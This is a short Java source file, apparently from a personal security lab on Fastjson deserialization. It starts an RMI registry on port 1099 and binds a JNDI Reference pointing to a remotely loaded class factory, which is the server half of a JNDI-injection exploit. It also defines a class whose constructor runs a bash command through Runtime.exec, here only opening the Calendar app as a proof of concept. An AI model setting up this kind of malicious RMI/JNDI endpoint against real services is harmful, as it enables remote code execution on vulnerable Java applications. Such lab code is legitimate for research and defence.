package com.huangbo.fastjson;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import lombok.Data;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiFastJsonSafeServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
//        Reference reference = new javax.naming.Reference("com.huangbo.fastjson.Hello1", "com.huangbo.fastjson.Hello1", "http://127.0.0.1:1099/");
        Reference reference = new javax.naming.Reference("com.huangbo.fastjson.Hello", "com.huangbo.fastjson.Hello", "http://127.0.0.1:1099/");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);
    }
}
@Data
class Hello2 {// 这里不是public所以不能调用
    String hello;

    public Hello2() {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c",
                    "/Applications/Calendar.app/Contents/MacOS/Calendar"});
        } catch (Exception e) {
        }
    }
}